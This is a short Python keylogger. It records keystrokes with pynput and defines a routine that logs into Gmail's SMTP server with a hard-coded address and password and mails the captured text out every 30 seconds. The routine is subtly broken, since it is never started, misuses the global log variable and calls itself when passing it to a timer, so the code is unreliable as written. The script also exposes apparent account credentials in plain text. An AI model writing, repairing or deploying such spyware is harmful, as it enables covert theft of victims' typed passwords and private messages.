import pynput.keyboard
import smtplib
import threading

log = ""


def callback_func(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)

def thread_function():
    send_email("ysfasnbjk1111@gmail.com","Yusuf123",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_function())
    timer_object.start()


with keylogger_listener:
    keylogger_listener.join()